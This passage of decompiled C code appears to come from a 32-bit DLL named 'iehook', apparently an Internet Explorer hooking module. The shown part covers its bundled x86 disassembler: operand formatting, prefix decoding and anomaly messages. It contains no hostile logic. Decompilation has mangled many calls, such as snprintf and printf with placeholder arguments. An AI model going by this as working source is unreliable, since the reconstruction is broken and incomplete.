                        v1387 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
                        v1390 = v1451;
                        goto lab_0x1000961e;
                    }
                    default: {
                        // 0x10009559
                        *(int32_t *)(v1443 + 8) = 3619;
                        *(int32_t *)(v1443 + 4) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *(int32_t *)v1443 = (int32_t)&g3;
                        __wassert();
                        v1388 = *v18;
                        v1389 = v1451;
                        goto lab_0x10009624;
                    }
                }
            }
        }
    }
  lab_0x10008b7c:;
    int32_t * v1456 = v1332;
    int32_t * v1457 = v1333;
    int32_t v1458 = v1331 >> 31; // 0x10008b7f
    *v1456 = v1458;
    *v1457 = v1331;
    int32_t v1459 = function_10002a90((int32_t)&g173, (int32_t)&g173); // 0x10008b84
    int32_t v1460 = v79 + 8; // 0x10008b89
    int32_t * v1461 = (int32_t *)v1460; // 0x10008b89
    *v1461 = v1459;
    int32_t * v1462 = (int32_t *)(v79 + 12); // 0x10008b8c
    *v1462 = v1458;
    *v47 = *v47 | 1;
    int32_t v1463 = *v1334; // 0x10008b99
    int32_t v1464 = v1463; // 0x10008b9f
    if ((v1463 & 0x4000) != 0) {
        char v1465 = *v2; // 0x10008ba1
        char v1466 = v1465; // 0x10008ba8
        if ((v1465 & 2) != 0) {
            // 0x10008baa
            *v1456 = 3571;
            *v1457 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
            __wassert();
            v1466 = *v2;
        }
        // 0x10008bc1
        *v2 = v1466 | 2;
        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
        char v1467 = *v29; // 0x10008bdf
        *v29 = v1467 & -52 | v75 & 3 | v1467 + 16 & 48;
        v1464 = *v1334;
    }
    // 0x10008c06
    if ((v1464 & 0x2000) != 0) {
        // 0x10008c0e
        if (*v34 != 0x4001) {
            // 0x10008c1a
            if ((*v2 & 4) != 0) {
                // 0x10008c23
                *v1456 = 3571;
                *v1457 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
                __wassert();
            }
        }
        // 0x10008c3a
        *v2 = *v2 | 4;
        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
        char v1468 = *v29; // 0x10008c52
        *v29 = v1468 & 51 | 4 * v75 & 12 | v1468 + 64 & -64;
    }
    char v1469 = *v25; // 0x10008c76
    if ((v1469 & 16) == 0) {
        // 0x10008c7f
        if ((*v28 & 8) != 0) {
            char v1470 = v1469; // 0x10008c8c
            if (v16 == 0) {
                uint32_t v1471 = *v21; // 0x10008c8e
                uint32_t v1472 = *v23 + v1471; // 0x10008c95
                *v1456 = *v24 + v1471 / 0x80000000 + (int32_t)(v1472 < v1471);
                *v1457 = v1472;
                *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                _printf((char *)&g173);
                v1470 = *v25;
            }
            // 0x10008cb0
            *v25 = v1470 | 16;
        }
    }
    // 0x10008cb7
    *v28 = *v28 & -9;
    *v37 = 1;
    *v35 = *(int32_t *)(v79 + 16);
    *v2 = *v2 | 16;
    if (*v15 != 1) {
        // 0x10008ce1
        *v1456 = 3577;
        *v1457 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *(int32_t *)(v63 - 12) = (int32_t)L"Instruction->OperandCount == 1";
        __wassert();
    }
    // 0x10008cf8
    v74 = v1331;
    v67 = v63;
    int32_t * v1373; // 0x10003490
    int32_t * v1375; // 0x10003490
    int32_t v1374; // 0x10003490
    int32_t v1377; // 0x10003490
    int32_t v1376; // 0x10003490
    int32_t v1379; // 0x10003490
    int32_t v1378; // 0x10003490
    if ((a3 & 2) == 0) {
        goto lab_0x1000af15;
    } else {
        unsigned char v1473 = *v26 & 15;
        if (v1473 == 2) {
            unsigned char v1474 = *v18; // 0x10008f7a
            int32_t v1475 = v1474; // 0x10008f7a
            *v1456 = (int32_t)"[ip+ilen";
            *v1457 = v1474 == -1 ? 0 : 256 - v1475;
            int32_t * v1476 = (int32_t *)(v63 - 12);
            *v1476 = v19 + v1475;
            int32_t v1477 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008fa1
            unsigned char v1478 = *v18 + (char)v1477; // 0x10008fa6
            *v18 = v1478;
            int32_t v1479 = v1478; // 0x10008fac
            int32_t v1480; // 0x10003490
            if (*v46 < 0) {
                // 0x10008ff7
                *v1456 = (int32_t)-*v49;
                *v1457 = (int32_t)"-0x%02X";
                v1480 = v1478 == -1 ? 0 : 256 - v1479;
            } else {
                if (v1478 == -1) {
                    // 0x10008fe6
                    *v1456 = (int32_t)*v49;
                    *v1457 = (int32_t)"+0x%02X";
                    v1480 = 0;
                } else {
                    // 0x10008fcd
                    *v1456 = (int32_t)*v49;
                    *v1457 = (int32_t)"+0x%02X";
                    v1480 = 256 - v1479;
                }
            }
            // 0x1000901c
            *v1476 = v1480;
            int32_t * v1481 = (int32_t *)(v63 - 16);
            *v1481 = v19 + v1479;
            int32_t v1482 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10009025
            unsigned char v1483 = *v18 + (char)v1482; // 0x1000902a
            *v18 = v1483;
            int32_t v1484 = v1483; // 0x10009030
            *v1456 = (int32_t)(*(int16_t *)v1460 + *(int16_t *)v22);
            *v1457 = (int32_t)"]=0x%04X";
            v1375 = v1481;
            v1373 = v1476;
            v1374 = v1483 == -1 ? 0 : 256 - v1484;
            v1376 = v1484;
            goto lab_0x10009060;
        } else {
            switch ((int32_t)v1473) {
                case 4: {
                    unsigned char v1485 = *v18; // 0x10008e62
                    int32_t v1486 = v1485; // 0x10008e62
                    *v1456 = (int32_t)"[eip+ilen";
                    *v1457 = v1485 == -1 ? 0 : 256 - v1486;
                    int32_t * v1487 = (int32_t *)(v63 - 12);
                    *v1487 = v19 + v1486;
                    int32_t v1488 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008e89
                    char v1489 = *v18 + (char)v1488; // 0x10008e8e
                    *v18 = v1489;
                    char v1490 = v1489; // 0x10008e9d
                    if ((*v1462 | *v1461) == 0) {
                        // 0x10008e9f
                        *v1456 = 3581;
                        *v1457 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *v1487 = (int32_t)L"(Operand)->TargetAddress";
                        __wassert();
                        v1490 = *v18;
                    }
                    unsigned char v1491 = v1490;
                    int32_t v1492 = v1491;
                    int32_t v1493; // 0x10003490
                    if (*v46 < 0) {
                        // 0x10008efd
                        *v1456 = -*v45;
                        *v1457 = (int32_t)"-0x%02lX";
                        v1493 = v1491 == -1 ? 0 : 256 - v1492;
                    } else {
                        if (v1491 == -1) {
                            // 0x10008eed
                            *v1456 = *v45;
                            *v1457 = (int32_t)"+0x%02lX";
                            v1493 = 0;
                        } else {
                            // 0x10008ed5
                            *v1456 = *v45;
                            *v1457 = (int32_t)"+0x%02lX";
                            v1493 = 256 - v1492;
                        }
                    }
                    // 0x10008f24
                    *v1487 = v1493;
                    int32_t * v1494 = (int32_t *)(v63 - 16);
                    *v1494 = v19 + v1492;
                    int32_t v1495 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008f2d
                    unsigned char v1496 = *v18 + (char)v1495; // 0x10008f32
                    *v18 = v1496;
                    int32_t v1497 = v1496; // 0x10008f38
                    if (v1496 == -1) {
                        // 0x10008f64
                        *v1456 = *v1461 + *v23;
                        *v1457 = (int32_t)"]=0x%04lX";
                        v1375 = v1494;
                        v1373 = v1487;
                        v1374 = 0;
                        v1376 = v1497;
                    } else {
                        // 0x10008f46
                        *v1456 = *v1461 + *v23;
                        *v1457 = (int32_t)"]=0x%04lX";
                        v1375 = v1494;
                        v1373 = v1487;
                        v1374 = 256 - v1497;
                        v1376 = v1497;
                    }
                    goto lab_0x10009060;
                }
                case 8: {
                    unsigned char v1498 = *v18; // 0x10008d3f
                    int32_t v1499 = v1498; // 0x10008d3f
                    *v1456 = (int32_t)"[rip+ilen";
                    *v1457 = v1498 == -1 ? 0 : 256 - v1499;
                    int32_t * v1500 = (int32_t *)(v63 - 12); // 0x10008d65
                    *v1500 = v19 + v1499;
                    int32_t v1501 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008d66
                    char v1502 = *v18 + (char)v1501; // 0x10008d6b
                    *v18 = v1502;
                    char v1503 = v1502; // 0x10008d7a
                    if ((*v1462 | *v1461) == 0) {
                        // 0x10008d7c
                        *v1456 = 3581;
                        *v1457 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *v1500 = (int32_t)L"(Operand)->TargetAddress";
                        __wassert();
                        v1503 = *v18;
                    }
                    unsigned char v1504 = v1503;
                    int32_t v1505 = *v46; // 0x10008d93
                    int32_t v1506 = *v45; // 0x10008d99
                    int32_t v1507 = v1504 == -1 ? 0 : 256 - (int32_t)v1504;
                    int32_t * v1508; // 0x10003490
                    int32_t v1509; // 0x10003490
                    if (v1505 < 0) {
                        // 0x10008df1
                        *v1456 = -((v1505 + (int32_t)(v1506 != 0)));
                        *v1457 = -v1506;
                        *v1500 = (int32_t)"-0x%02I64X";
                        *(int32_t *)(v63 - 16) = v1507;
                        int32_t v1510 = v63 - 20; // 0x10008e0b
                        int32_t * v1511 = (int32_t *)v1510;
                        *v1511 = v19 + (int32_t)*v18;
                        v1508 = v1511;
                        v1509 = v1510;
                    } else {
                        // 0x10008dc2
                        *v1456 = v1505;
                        *v1457 = v1506;
                        *v1500 = (int32_t)"+0x%02I64X";
                        *(int32_t *)(v63 - 16) = v1507;
                        int32_t v1512 = v63 - 20; // 0x10008dd5
                        int32_t * v1513 = (int32_t *)v1512;
                        *v1513 = v19 + (int32_t)*v18;
                        v1508 = v1513;
                        v1509 = v1512;
                    }
                    int32_t v1514 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008e0c
                    unsigned char v1515 = *v18 + (char)v1514; // 0x10008e11
                    *v18 = v1515;
                    int32_t v1516 = v1515; // 0x10008e17
                    uint32_t v1517 = *v23; // 0x10008e33
                    uint32_t v1518 = *v1461 + v1517; // 0x10008e39
                    int32_t v1519 = *v1462; // 0x10008e42
                    *(int32_t *)(v1509 + 16) = v1519 + *v24 + (int32_t)(v1518 < v1517);
                    *(int32_t *)(v1509 + 12) = v1518;
                    *(int32_t *)(v1509 + 8) = (int32_t)"]=0x%04I64X";
                    *(int32_t *)(v1509 + 4) = v1515 == -1 ? 0 : 256 - v1516;
                    *v1508 = v19 + v1516;
                    v1377 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
                    v1378 = v1509 + 20;
                    goto lab_0x10009071;
                }
                default: {
                    // 0x10008d23
                    *v1456 = 3581;
                    *v1457 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v63 - 12) = (int32_t)&g3;
                    __wassert();
                    v1379 = v63;
                    goto lab_0x10009077;
                }
            }
        }
    }
  lab_0x1000847c:
    // 0x1000847c
    *(int32_t *)(v63 - 4) = 3496;
    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *(int32_t *)(v63 - 12) = (int32_t)&g3;
    __wassert();
    *(int32_t *)(v79 + 32) = *(int32_t *)v69;
    *(int32_t *)(v79 + 36) = 0;
    v804 = v822;
    goto lab_0x100084f7;
  lab_0x10007e33:;
    char v1356 = *v18 + (char)v808; // 0x10007e33
    *v18 = v1356;
    v807 = v1356;
    v817 = v819;
    goto lab_0x10007e39;
  lab_0x10007e39:;
    int32_t v1357 = v817;
    *(char *)(v19 + (int32_t)v807) = 93;
    unsigned char v1358 = *v18 + 1; // 0x10007e45
    *v18 = v1358;
    v74 = v820;
    v67 = v1357;
    if ((a3 & 16) == 0) {
        goto lab_0x1000af15;
    } else {
        // 0x10007e5b
        *(char *)(v19 + (int32_t)v1358) = 123;
        *v18 = *v18 + 1;
        int32_t v1359 = *v824; // 0x10007e69
        v60 = v1359;
        v59 = v824;
        v71 = v820;
        v68 = v1357;
        if ((v1359 & 0xe000) != 0) {
            goto lab_0x10004487;
        } else {
            int32_t v1360 = v1357 - 4; // 0x10007e75
            *(int32_t *)v1360 = 3652;
            v58 = v824;
            v70 = v820;
            v64 = v1360;
            goto lab_0x10004475;
        }
    }
  lab_0x1000a20f:;
    int32_t v1361 = v1340; // 0x1000a215
    if ((v1340 & 2048) != 0) {
        // 0x1000a217
        *(char *)(v19 + (int32_t)*v18) = 99;
        *v18 = *v18 + 1;
        v1361 = *v1264;
    }
    int32_t v1362 = v1361; // 0x1000a22f
    if ((v1361 & 0x4000) != 0) {
        // 0x1000a231
        *(char *)(v19 + (int32_t)*v18) = 87;
        *v18 = *v18 + 1;
        v1362 = *v1264;
    }
    int32_t v1363 = v1362; // 0x1000a249
    if ((v1362 & 512) != 0) {
        // 0x1000a24b
        *(char *)(v19 + (int32_t)*v18) = 83;
        *v18 = *v18 + 1;
        v1363 = *v1264;
    }
    int32_t v1364 = v1363; // 0x1000a263
    if ((v1363 & 0x10000) != 0) {
        // 0x1000a265
        *(char *)(v19 + (int32_t)*v18) = 65;
        *v18 = *v18 + 1;
        v1364 = *v1264;
    }
    int32_t v1365 = v1364; // 0x1000a27d
    if ((v1364 & 0x40000) != 0) {
        // 0x1000a27f
        *(char *)(v19 + (int32_t)*v18) = 80;
        *v18 = *v18 + 1;
        v1365 = *v1264;
    }
    unsigned char v1366 = *v18;
    char v1367 = v1366; // 0x1000a297
    int32_t v1368 = v1365; // 0x1000a297
    if ((v1365 & 0x20000) != 0) {
        // 0x1000a299
        *(char *)(v19 + (int32_t)v1366) = 76;
        char v1369 = *v18 + 1; // 0x1000a2a5
        *v18 = v1369;
        v1367 = v1369;
        v1368 = *v1264;
    }
    char v1370 = v1367;
    char v1371 = v1370; // 0x1000a2b1
    if ((v1368 & 0x80000) != 0) {
        // 0x1000a2b3
        *(char *)(v19 + (int32_t)v1370) = 71;
        char v1372 = *v18 + 1; // 0x1000a2bf
        *v18 = v1372;
        v1371 = v1372;
    }
    // 0x1000a2c5
    *(char *)(v19 + (int32_t)v1371) = 125;
    v1238 = v1262;
    v1239 = v1263;
    goto lab_0x1000af0f;
  lab_0x1000a209:
    // 0x1000a209
    *v18 = *v18 + 1;
    v1340 = *v1264;
    goto lab_0x1000a20f;
  lab_0x10009060:
    // 0x10009060
    *v1373 = v1374;
    *v1375 = v1376 + v19;
    v1377 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
    v1378 = v63;
    goto lab_0x10009071;
  lab_0x1000960d:
    // 0x1000960d
    *(int32_t *)(v1396 - 4) = v1397;
    *(int32_t *)(v1396 - 8) = v1398 + v19;
    v1387 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
    v1390 = v1396 + 8;
    goto lab_0x1000961e;
  lab_0x10009071:
    // 0x10009071
    *v18 = *v18 + (char)v1377;
    v1379 = v1378;
    goto lab_0x10009077;
  lab_0x10009077:;
    int32_t v1380 = v1379;
    v74 = v1331;
    v67 = v1380;
    if ((a3 & 16) == 0) {
        goto lab_0x1000af15;
    } else {
        // 0x10009081
        *(char *)(v19 + (int32_t)*v18) = 123;
        *v18 = *v18 + 1;
        int32_t v1381 = *v1334; // 0x10009093
        int32_t v1382 = v1381; // 0x10009099
        if ((v1381 & 0xe000) == 0) {
            // 0x1000909b
            *(int32_t *)(v1380 - 4) = 3582;
            *(int32_t *)(v1380 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v1380 - 12) = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
            __wassert();
            v1382 = *v1334;
        }
        int32_t v1383 = v1382; // 0x100090b8
        if ((v1382 & 0x200000) != 0) {
            // 0x100090ba
            *(char *)(v19 + (int32_t)*v18) = 114;
            *v18 = *v18 + 1;
            v1383 = *v1334;
        }
        int32_t v1384 = v1383; // 0x100090d2
        if ((v1383 & 0x100000) != 0) {
            // 0x100090d4
            *(char *)(v19 + (int32_t)*v18) = 102;
            *v18 = *v18 + 1;
            v1384 = *v1334;
        }
        int32_t v1385 = v1384; // 0x100090ec
        if ((v1384 & 1024) != 0) {
            // 0x100090ee
            *(char *)(v19 + (int32_t)*v18) = 99;
            *v18 = *v18 + 1;
            v1385 = *v1334;
        }
        // 0x10009100
        v72 = v1331;
        v61 = v1385;
        v65 = v1380;
        if ((int16_t)v1385 > -1) {
            goto lab_0x1000ae34;
        } else {
            // 0x1000910d
            *(char *)(v19 + (int32_t)*v18) = 88;
            v73 = v1331;
            v66 = v1380;
            goto lab_0x1000ae47;
        }
    }
  lab_0x1000961e:;
    char v1386 = *v18 + (char)v1387; // 0x1000961e
    *v18 = v1386;
    v1388 = v1386;
    v1389 = v1390;
    goto lab_0x10009624;
  lab_0x10009624:;
    int32_t v1391 = v1389;
    *(char *)(v19 + (int32_t)v1388) = 93;
    unsigned char v1392 = *v18 + 1; // 0x10009630
    *v18 = v1392;
    v74 = v1393;
    v67 = v1391;
    if ((a3 & 16) == 0) {
        goto lab_0x1000af15;
    } else {
        // 0x10009646
        *(char *)(v19 + (int32_t)v1392) = 123;
        *v18 = *v18 + 1;
        int32_t v1394 = *v823; // 0x10009654
        v60 = v1394;
        v59 = v823;
        v71 = v1393;
        v68 = v1391;
        if ((v1394 & 0xe000) != 0) {
            goto lab_0x10004487;
        } else {
            int32_t v1395 = v1391 - 4; // 0x10009660
            *(int32_t *)v1395 = 3620;
            v58 = v823;
            v70 = v1393;
            v64 = v1395;
            goto lab_0x10004475;
        }
    }
  lab_0x1000b503:
    // 0x1000b503
    _printf((char *)&g173);
    v803 = (int32_t *)(v816 + 16);
    goto lab_0x1000b50b;
  lab_0x1000b50b:
    // 0x1000b50b
    *v803 = ___iob_func() + 32;
    _fflush((struct _IO_FILE *)&g173);
    goto lab_0x1000af28;
}

// Address range: 0x1000b7b0 - 0x1000fde4
int32_t function_1000b7b0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x1000b7cb
    int32_t v2 = *v1; // 0x1000b7cb
    int32_t v3 = a3 & 4; // 0x1000b7d1
    char * v4 = (char *)v3; // 0x1000b7f2
    int32_t v5; // bp-68, 0x1000b7b0
    if ((a3 & 2) != 0 && v3 == 0) {
        // 0x1000b7f8
        v5 = 986;
        __wassert();
        v4 = (char *)1;
    }
    int32_t v6 = a3 & 8; // 0x1000b7d4
    int32_t v7; // 0x1000b7b0
    int32_t * v8; // 0x1000b832
    char * v9; // 0x1000b851
    if (a2 == 0) {
        // 0x1000fdad
        v5 = 992;
        v7 = &v5;
        goto lab_0x1000fdb2;
    } else {
        // 0x1000b821
        v5 = a1;
        if (function_100011d0(a1) == 0) {
            // 0x1000fdad
            v5 = 992;
            v7 = &v5;
            goto lab_0x1000fdb2;
        } else {
            // 0x1000b832
            v8 = (int32_t *)(a1 + 288);
            if (*v8 != a2) {
                // 0x1000b83a
                v5 = 996;
                __wassert();
            }
            // 0x1000b851
            v9 = (char *)(a1 + 264);
            if (*v9 != 0) {
                // 0x1000b863
                v5 = 997;
                __wassert();
                goto lab_0x1000b87a;
            } else {
                // 0x1000b85a
                if (*(int32_t *)(a1 + 296) == 0) {
                    goto lab_0x1000b87a;
                } else {
                    // 0x1000b863
                    v5 = 997;
                    __wassert();
                    goto lab_0x1000b87a;
                }
            }
        }
    }
  lab_0x1000b926_3:;
    // 0x1000b926
    int32_t v10; // 0x1000b7b0
    int32_t v11 = 56 * v10;
    if (*(int32_t *)(v11 + (int32_t)&g52 + 8) != 0x40000000) {
        // break -> 0x1000bf16
        goto lab_0x1000bf16;
    }
    // 0x1000b933
    int32_t v12; // 0x1000b7b0
    int32_t v13 = v12;
    char * v14; // 0x1000b7b0
    char v15 = *v14; // 0x1000b933
    char v16 = v15; // 0x1000b93a
    int32_t v17 = v13; // 0x1000b93a
    int32_t v18; // 0x1000b7b0
    int32_t v19 = v18; // 0x1000b93a
    char v20; // 0x1000b7b0
    char v21; // 0x1000b893
    int32_t v22; // 0x1000b7b0
    int32_t v23; // 0x1000b7b0
    int32_t v24; // 0x1000b7bd
    int32_t * v25; // 0x1000b7b0
    int32_t * v26; // 0x1000b7b0
    int32_t * v27; // 0x1000b7b0
    int32_t * v28; // 0x1000b7b0
    int32_t * v29; // 0x1000b7b0
    int32_t * v30; // 0x1000b7b0
    int32_t * v31; // 0x1000b7b0
    int32_t v32; // 0x1000b7b0
    if ((v15 & 16) == 0) {
        uint32_t v33 = *v31; // 0x1000b93e
        v16 = v15;
        v17 = v13;
        v19 = v18;
        if (v33 != 0) {
            int32_t v34 = v13 & -256 | v10; // 0x1000b946
            int32_t v35 = 0;
            while (*(char *)(v35 + v32) != v21) {
                int32_t v36 = v35 + 1; // 0x1000b959
                v20 = v15;
                v22 = v34;
                v23 = v18;
                if (v36 >= v33) {
                    goto lab_0x1000b99a;
                }
                v35 = v36;
            }
            char v37 = v15; // 0x1000b968
            int32_t v38 = v18; // 0x1000b968
            if (v6 == 0) {
                uint32_t v39 = *v8; // 0x1000b96a
                uint32_t v40 = *v25 + v39; // 0x1000b971
                *v26 = v10;
                *v28 = *v27 + v39 / 0x80000000 + (int32_t)(v40 < v39);
                *v29 = v40;
                *v30 = (int32_t)"[0x%08I64X] ANOMALY: Duplicate prefix 0x%02X\n";
                _printf((char *)&g173);
                v37 = *v14;
                v38 = v24;
            }
            char v41 = v37 | 16; // 0x1000b990
            *v14 = v41;
            v16 = v41;
            v17 = v34;
            v19 = v38;
        }
    }
    // 0x1000b997
    v20 = v16;
    v22 = v17 & -256 | v10;
    v23 = v19;
  lab_0x1000b99a:;
    int32_t v42 = v23;
    int32_t v43 = v22;
    char v44 = v20; // 0x1000bb9b
    char * v45; // 0x1000b7b0
    char v46; // 0x1000b7b0
    int32_t v47; // 0x1000b7b0
    int32_t v48; // 0x1000b7b0
    int32_t v49; // 0x1000b7b0
    int32_t v50; // 0x1000b7b0
    char v51; // 0x1000b7b0
    char v52; // 0x1000b7b0
    int32_t v53; // 0x1000b7b0
    switch (g164) {
        case 0: {
            goto lab_0x1000bb9b;
        }
        case 1: {
            goto lab_0x1000bb9b;
        }
        case 2: {
            goto lab_0x1000bb9b;
        }
        case 3: {
            goto lab_0x1000bb9b;
        }
        case 4: {
            goto lab_0x1000bb9b;
        }
        case 5: {
            goto lab_0x1000bb9b;
        }
        case 6: {
            goto lab_0x1000bb9b;
        }
        case 7: {
            goto lab_0x1000bb9b;
        }
        case 8: {
            goto lab_0x1000bb9b;
        }
        case 9: {
            goto lab_0x1000bb9b;
        }
        case 10: {
            goto lab_0x1000bb9b;
        }
        case 18: {
            char v54 = v44; // 0x1000bc40
            int32_t v55 = v42; // 0x1000bc40
            if ((v44 & 16) == 0) {
                // 0x1000bc42
                v54 = v44;
                v55 = v42;
                if ((*(char *)(v42 + 93) & 8) != 0) {
                    char v56 = v44; // 0x1000bc4c
                    int32_t v57 = v42; // 0x1000bc4c
                    if (v6 == 0) {
                        uint32_t v58 = *v8; // 0x1000bc4e
                        uint32_t v59 = *v25 + v58; // 0x1000bc55
                        *v26 = *v27 + v58 / 0x80000000 + (int32_t)(v59 < v58);
                        *v28 = v59;
                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                        _printf((char *)&g173);
                        v56 = *v14;
                        v57 = v24;
                    }
                    char v60 = v56 | 16; // 0x1000bc73
                    *v14 = v60;
                    v54 = v60;
                    v55 = v57;
                }
            }
            int32_t v61 = v55;
            v46 = v54;
            v47 = v43;
            v49 = v61;
            if (*(int32_t *)(*v1 + 4) == 3) {
                goto lab_0x1000bbf5;
            } else {
                char * v62 = (char *)(v61 + 93); // 0x1000bc87
                *v62 = *v62 | 8;
                *(int32_t *)(v61 + 72) = 1;
                v52 = v51;
                v48 = v43;
                v50 = v61;
                goto lab_0x1000be37;
            }
        }
        case 26: {
            char v63 = v44; // 0x1000bc9e
            int32_t v64 = v42; // 0x1000bc9e
            if ((v44 & 16) == 0) {
                // 0x1000bca0
                v63 = v44;
                v64 = v42;
                if ((*(char *)(v42 + 93) & 8) != 0) {
                    char v65 = v44; // 0x1000bcaa
                    int32_t v66 = v42; // 0x1000bcaa
                    if (v6 == 0) {
                        uint32_t v67 = *v8; // 0x1000bcac
                        uint32_t v68 = *v25 + v67; // 0x1000bcb3
                        *v26 = *v27 + v67 / 0x80000000 + (int32_t)(v68 < v67);
                        *v28 = v68;
                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                        _printf((char *)&g173);
                        v65 = *v14;
                        v66 = v24;
                    }
                    char v69 = v65 | 16; // 0x1000bcd1
                    *v14 = v69;
                    v63 = v69;
                    v64 = v66;
                }
            }
            int32_t v70 = v64;
            int32_t v71 = *v1; // 0x1000bcd8
            v46 = v63;
            v47 = v71;
            v49 = v70;
            if (*(int32_t *)(v71 + 4) == 3) {
                goto lab_0x1000bbf5;
            } else {
                char * v72 = (char *)(v70 + 93); // 0x1000bce5
                *v72 = *v72 | 8;
                *(int32_t *)(v70 + 72) = 2;
                v52 = v51;
                v48 = v71;
                v50 = v70;
                goto lab_0x1000be37;
            }
        }
        case 34: {
            char v73 = v44; // 0x1000bcfc
            int32_t v74 = v42; // 0x1000bcfc
            if ((v44 & 16) == 0) {
                // 0x1000bcfe
                v73 = v44;
                v74 = v42;
                if ((*(char *)(v42 + 93) & 8) != 0) {
                    char v75 = v44; // 0x1000bd08
                    int32_t v76 = v42; // 0x1000bd08
                    if (v6 == 0) {
                        uint32_t v77 = *v8; // 0x1000bd0a
                        uint32_t v78 = *v25 + v77; // 0x1000bd11
                        *v26 = *v27 + v77 / 0x80000000 + (int32_t)(v78 < v77);
                        *v28 = v78;
                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                        _printf((char *)&g173);
                        v75 = *v14;
                        v76 = v24;
                    }
                    char v79 = v75 | 16; // 0x1000bd2f
                    *v14 = v79;
                    v73 = v79;
                    v74 = v76;
                }
            }
            int32_t v80 = v74;
            int32_t v81 = *v1; // 0x1000bd36
            v46 = v73;
            v47 = v81;
            v49 = v80;
            if (*(int32_t *)(v81 + 4) == 3) {
                goto lab_0x1000bbf5;
            } else {
                char * v82 = (char *)(v80 + 93); // 0x1000bd47
                *v82 = *v82 | 8;
                *(int32_t *)(v80 + 72) = 3;
                v52 = v51;
                v48 = v81;
                v50 = v80;
                goto lab_0x1000be37;
            }
        }
        case 72: {
            int32_t v83 = v42; // 0x1000bd5a
            if ((v44 & 16) == 0) {
                // 0x1000bd5c
                v83 = v42;
                if ((*(char *)(v42 + 93) & 8) != 0) {
                    char v84 = v44; // 0x1000bd66
                    int32_t v85 = v42; // 0x1000bd66
                    if (v6 == 0) {
                        uint32_t v86 = *v8; // 0x1000bd68
                        uint32_t v87 = *v25 + v86; // 0x1000bd6f
                        *v26 = *v27 + v86 / 0x80000000 + (int32_t)(v87 < v86);
                        *v28 = v87;
                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                        _printf((char *)&g173);
                        v84 = *v14;
                        v85 = v24;
                    }
                    // 0x1000bd8d
                    *v14 = v84 | 16;
                    v83 = v85;
                }
            }
            char * v88 = (char *)(v83 + 93); // 0x1000bd94
            *v88 = *v88 | 8;
            *(int32_t *)(v83 + 72) = 4;
            v52 = v51;
            v48 = v43;
            v50 = v83;
            goto lab_0x1000be37;
        }
        case 73: {
            // 0x1000bda4
            if ((v44 & 16) == 0) {
                char v89 = *(char *)(v42 + 93); // 0x1000bdad
                if ((v89 & 8) != 0) {
                    char v90 = v44; // 0x1000bdb7
                    if (v6 == 0) {
                        uint32_t v91 = *v8; // 0x1000bdb9
                        int32_t v92 = *v25; // 0x1000bdc0
                        uint32_t v93 = v92 + v91; // 0x1000bdc0
                        int32_t v94 = *v27; // 0x1000bdc6
                        *v26 = v94 + v91 / 0x80000000 + (int32_t)(v93 < v91);
                        *v28 = v93;
                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                        _printf((char *)&g173);
                        char v95 = *v14;
                        v90 = v95;
                    }
                    char v96 = v90; // 0x1000bdde
                    *v14 = v96 | 16;
                }
            }
            char * v97 = (char *)(v42 + 93); // 0x1000bde5
            *v97 = *v97 | 8;
            *(int32_t *)(v42 + 72) = 5;
            v52 = v51;
            v48 = v43;
            v50 = v42;
            goto lab_0x1000be37;
        }
        case 74: {
            int32_t v98 = v42; // 0x1000ba77
            if ((v44 & 16) == 0) {
                // 0x1000ba79
                v98 = v42;
                if ((*(char *)(v42 + 93) & 2) != 0) {
                    char v99 = v44; // 0x1000ba83
                    int32_t v100 = v42; // 0x1000ba83
                    if (v6 == 0) {
                        uint32_t v101 = *v8; // 0x1000ba85
                        uint32_t v102 = *v25 + v101; // 0x1000ba8c
                        *v26 = *v27 + v101 / 0x80000000 + (int32_t)(v102 < v101);
                        *v28 = v102;
                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Conflicting prefix\n";
                        _printf((char *)(v43 & 255));
                        v99 = *v14;
                        v100 = v24;
                    }
                    // 0x1000baaa
                    *v14 = v99 | 16;
                    v98 = v100;
                }
            }
            char v103 = v43; // 0x1000ba74
            int32_t v104 = v98;
            char * v105 = (char *)(v104 + 93); // 0x1000bab1
            char v106 = *v105; // 0x1000bab1
            v52 = v103;
            v48 = v43;
            v50 = v104;
            if ((v106 & 2) == 0) {
                // 0x1000babc
